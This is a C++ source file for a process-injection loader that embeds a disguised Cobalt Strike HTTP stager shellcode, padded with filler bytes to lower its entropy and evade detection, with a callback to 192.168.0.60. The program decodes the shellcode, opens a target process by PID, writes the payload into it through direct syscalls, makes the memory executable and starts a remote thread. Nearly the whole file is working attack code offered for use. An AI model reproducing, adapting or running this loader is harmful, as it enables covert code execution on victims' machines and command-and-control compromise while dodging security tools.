#include <iostream>
#include "syscalls.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

//fancy banner with fancy quote
char banner[] = "\n\n  @@@@@@ @@@  @@@ @@@@@@@@ @@@      @@@      @@@@@@@ @@@@@@@   @@@@@@  @@@@@@@  @@@ @@@\n !@@     @@!  @@@ @@!      @@!      @@!        @@!   @@!  @@@ @@!  @@@ @@!  @@@ @@! !@@\n  !@@!!  @!@!@!@! @!!!:!   @!!      @!!        @!!   @!@!!@!  @!@  !@! @!@@!@!   !@!@! \n     !:! !!:  !!! !!:      !!:      !!:        !!:   !!: :!!  !!:  !!! !!:        !!:  \n ::.: :   :   : : : :: ::: : ::.: : : ::.: :    :     :   : :  : :. :   :         .:   \n\n=============[The more predictable you are, the less you are able to get detected.]====";

BYTE payload[] = { 0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC8,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x66,0x81,0x78,0x18,0x0B,0x02,0x75,0x72,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A,0x48,0x8B,0x12,0xE9,0x4F,0xFF,0xFF,0xFF,0x5D,0x6A,0x00,0x49,0xBE,0x77,0x69,0x6E,0x69,0x6E,0x65,0x74,0x00,0x41,0x56,0x49,0x89,0xE6,0x4C,0x89,0xF1,0x41,0xBA,0x4C,0x77,0x26,0x07,0xFF,0xD5,0x48,0x31,0xC9,0x48,0x31,0xD2,0x4D,0x31,0xC0,0x4D,0x31,0xC9,0x41,0x50,0x41,0x50,0x41,0xBA,0x3A,0x56,0x79,0xA7,0xFF,0xD5,0xEB,0x73,0x5A,0x48,0x89,0xC1,0x41,0xB8,0xFB,0x20,0x00,0x00,0x4D,0x31,0xC9,0x41,0x51,0x41,0x51,0x6A,0x03,0x41,0x51,0x41,0xBA,0x57,0x89,0x9F,0xC6,0xFF,0xD5,0xEB,0x59,0x5B,0x48,0x89,0xC1,0x48,0x31,0xD2,0x49,0x89,0xD8,0x4D,0x31,0xC9,0x52,0x68,0x00,0x02,0x40,0x84,0x52,0x52,0x41,0xBA,0xEB,0x55,0x2E,0x3B,0xFF,0xD5,0x48,0x89,0xC6,0x48,0x83,0xC3,0x50,0x6A,0x0A,0x5F,0x48,0x89,0xF1,0x48,0x89,0xDA,0x49,0xC7,0xC0,0xFF,0xFF,0xFF,0xFF,0x4D,0x31,0xC9,0x52,0x52,0x41,0xBA,0x2D,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x06,0x18,0x7B,0xFF,0xD5,0x85,0xC0,0x0F,0x85,0x9D,0x01,0x00,0x00,0x48,0xFF,0xCF,0x0F,0x84,0x8C,0x01,0x00,0x00,0xEB,0xD3,0xE9,0xE4,0x01,0x00,0x00,0xE8,0xA2,0xFF,0xFF,0xFF,0x2F,0x53,0x39,0x5A,0x77,0x00,0xE8,0x59,0xA8,0xFA,0xE6,0xC7,0xBA,0xD1,0xEF,0xE8,0xC9,0xF1,0x9B,0x3E,0xB5,0xD0,0xDE,0x7A,0x84,0x09,0x38,0x6D,0xE9,0xD4,0x66,0xC0,0x0A,0x66,0x1E,0x63,0x67,0x05,0x54,0xFC,0x69,0xAD,0x86,0x96,0x26,0xC9,0x13,0xF1,0x4F,0xD5,0x45,0x57,0x56,0xAF,0x42,0xDA,0xA6,0x1E,0x1E,0x0F,0x97,0x12,0xE6,0xDA,0x48,0x81,0x17,0x47,0xF3,0x9A,0xBB,0xA8,0x34,0xD1,0x95,0x3F,0x03,0xAB,0x24,0x00,0x55,0x73,0x65,0x72,0x2D,0x41,0x67,0x65,0x6E,0x74,0x3A,0x20,0x4D,0x6F,0x7A,0x69,0x6C,0x6C,0x61,0x2F,0x35,0x2E,0x30,0x20,0x28,0x63,0x6F,0x6D,0x70,0x61,0x74,0x69,0x62,0x6C,0x65,0x3B,0x20,0x4D,0x53,0x49,0x45,0x20,0x39,0x2E,0x30,0x3B,0x20,0x57,0x69,0x6E,0x64,0x6F,0x77,0x73,0x20,0x4E,0x54,0x20,0x36,0x2E,0x31,0x3B,0x20,0x54,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x72,0x69,0x64,0x65,0x6E,0x74,0x2F,0x35,0x2E,0x30,0x3B,0x20,0x58,0x42,0x4C,0x57,0x50,0x37,0x3B,0x20,0x5A,0x75,0x6E,0x65,0x57,0x50,0x37,0x29,0x0D,0x0A,0x00,0x94,0x50,0x8B,0x6D,0xE9,0x6C,0x9E,0xC5,0x99,0xA9,0x40,0xA2,0xD5,0xAF,0x41,0xAF,0xF2,0xF7,0x13,0x53,0xDF,0x67,0x28,0x56,0x8F,0xD8,0x7C,0xE0,0xB6,0xEA,0xC3,0xB4,0x16,0xEF,0x0A,0xE0,0x41,0xC4,0xEF,0x29,0x64,0x90,0xE3,0x6A,0xFE,0xBF,0xC6,0x13,0xE7,0x79,0x26,0x10,0xA2,0xB7,0x70,0xF7,0x46,0xB5,0x47,0x49,0x9E,0x45,0x3C,0x56,0xFA,0x09,0x97,0xC5,0xCC,0x9D,0x51,0xEF,0x2A,0x1D,0x59,0x03,0x70,0xC2,0x39,0x55,0xDC,0x46,0xE0,0xEF,0xC7,0x2A,0x3E,0x26,0x31,0x1E,0x66,0xF1,0x79,0xC8,0xE7,0x4A,0xB4,0x22,0x16,0xA3,0x3B,0xC0,0x4F,0x9F,0xFD,0xC5,0x34,0x6A,0x12,0xD0,0x91,0x98,0x26,0x61,0x0B,0xB6,0x32,0x2E,0x8D,0x24,0xE6,0x76,0x3B,0xFD,0x9E,0xD1,0x34,0xE0,0xFD,0xA8,0xCD,0x17,0xC6,0xB8,0x04,0xAE,0x36,0x4B,0x91,0x69,0x6D,0xB6,0xB9,0x69,0x6D,0x2A,0xBF,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x93,0x05,0x24,0x94,0xE8,0xA1,0xA3,0xF9,0xBB,0x84,0x6D,0x24,0x34,0x88,0xC1,0x59,0x8A,0xC5,0xBE,0x64,0xCE,0xFA,0x04,0x28,0xF3,0x50,0xAD,0xF0,0x14,0x14,0x5F,0xC7,0x8D,0x8C,0xD8,0xBC,0x19,0x79,0x75,0xFB,0x6B,0xB4,0xFD,0x43,0xCE,0x9D,0x4F,0x8A,0x9D,0x77,0x0E,0xFE,0xDA,0x4C,0x34,0x70,0x16,0xA8,0xC0,0xE0,0xE9,0x00,0x41,0xBE,0xF0,0xB5,0xA2,0x56,0xFF,0xD5,0x48,0x31,0xC9,0xBA,0x00,0x00,0x40,0x00,0x41,0xB8,0x00,0x10,0x00,0x00,0x41,0xB9,0x40,0x00,0x00,0x00,0x41,0xBA,0x58,0xA4,0x53,0xE5,0xFF,0xD5,0x48,0x93,0x53,0x53,0x48,0x89,0xE7,0x48,0x89,0xF1,0x48,0x89,0xDA,0x41,0xB8,0x00,0x20,0x00,0x00,0x49,0x89,0xF9,0x41,0xBA,0x12,0x96,0x89,0xE2,0xFF,0xD5,0x48,0x83,0xC4,0x20,0x85,0xC0,0x74,0xB6,0x66,0x8B,0x07,0x48,0x01,0xC3,0x85,0xC0,0x75,0xD7,0x58,0x58,0x58,0x48,0x05,0x00,0x00,0x00,0x00,0x50,0xC3,0xE8,0x9F,0xFD,0xFF,0xFF,0x31,0x39,0x32,0x2E,0x31,0x36,0x38,0x2E,0x30,0x2E,0x36,0x30,0x00,0x5E,0x2E,0x78,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x2A,0x90 };
constexpr int cs_shellcode_length = 891; //the default length of high entropy default shellcode in cobalt strike. Change it if you are using another C2
constexpr int number_of_chunks = 5; //make sure it's the same number of chunks you used while encoding
constexpr int chunk_size = cs_shellcode_length / number_of_chunks;
constexpr int remaining_bytes = cs_shellcode_length % number_of_chunks;
constexpr int payload_size_after_entropy_reduction = cs_shellcode_length * 2;

PBYTE shannonDecode(PBYTE high_ent_payload)

{
    constexpr int payload_size = (payload_size_after_entropy_reduction + 1) / 2;
    BYTE lowEntropyPayload[payload_size_after_entropy_reduction] = { 0 };
    memcpy_s(lowEntropyPayload, sizeof lowEntropyPayload, high_ent_payload, payload_size_after_entropy_reduction);
    static BYTE restored_payload[payload_size] = { 0 };
    int encodedShellcodeOffset = 0;
    int shellcodeOffset = 0;

    for (size_t i = 0; i < number_of_chunks; i++)
    {
        for (size_t j = 0; j < chunk_size; j++)
        {
            restored_payload[shellcodeOffset] = lowEntropyPayload[encodedShellcodeOffset];
            encodedShellcodeOffset++;
            shellcodeOffset++;
        }

        for (size_t k = 0; k < chunk_size; k++)
        {
            encodedShellcodeOffset++;
        }
    }

    if (remaining_bytes)
    {
        for (size_t i = 0; i < sizeof remaining_bytes; i++)
        {
            restored_payload[shellcodeOffset++] = high_ent_payload[encodedShellcodeOffset++];
        }
    }
    return restored_payload;
}


int main(int argc, char* argv[])
{
    for (int index = 0; index < sizeof(banner); index++) {
        printf("%c", banner[index]);
    }
    printf("\n\n\n");

    const auto shellcode = shannonDecode(payload);
    if (shellcode) {
        printf("[*] Shellcode converted back to high-entropy\n");
    }
    else {
        printf("[-] Unable to decode the shellcode\n");
        return EXIT_FAILURE;
    }

    if (argc != 2) {
        printf("[!] Usage: %s <pid to inject into>\n", argv[0]);
        return EXIT_FAILURE;
    }

    auto pid = atoi(argv[1]);

    if (!pid) {
        printf("[-] Invalid PID: %s\n", argv[1]);
        return EXIT_FAILURE;
    }

    HANDLE hProcess;
    CLIENT_ID clientId{};
    clientId.UniqueProcess = (HANDLE)pid;
    OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };
    auto status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);

    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to open process: %d, NTSTATUS: 0x%x\n", pid, status);
        return EXIT_FAILURE;
    }
    printf("[*] Successfully opened process %d\n", pid);

    size_t shellcodeSize = cs_shellcode_length; //I didn't want to change the variable names

    printf("[*] Shellcode length: %lld\n", shellcodeSize);
    PVOID baseAddress = NULL;
    size_t allocSize = shellcodeSize;
    status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &allocSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to allocate memory, NTSTATUS: 0x%x\n", status);
        return EXIT_FAILURE;
    }
    printf("[*] Successfully allocated RW memory at 0x%p of size %lld\n", baseAddress, allocSize);

    size_t bytesWritten;

    int n = 0;
    for (int i = 0; i < 891; i++) {
        NtWriteVirtualMemory(hProcess, (LPVOID)((ULONG_PTR)baseAddress + n), &shellcode[i], 0x01, NULL);
        n++;
    }

    printf("[*] Successfully wrote shellcode to memory\n");

    DWORD oldProtect;
    status = NtProtectVirtualMemory(hProcess, &baseAddress, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to change permission to RX on memory at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
        return EXIT_FAILURE;
    }
    printf("[*] Successfully changed memory protections to RX\n");

    HANDLE hThread;
    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, baseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to create thread, NTSTATUS: 0x%x\n", status);
        return EXIT_FAILURE;
    }
    printf("[*] Successfully created thread in process\n");

    printf("[+] Shellcode injected using syscalls!\n");
    return EXIT_SUCCESS;
}
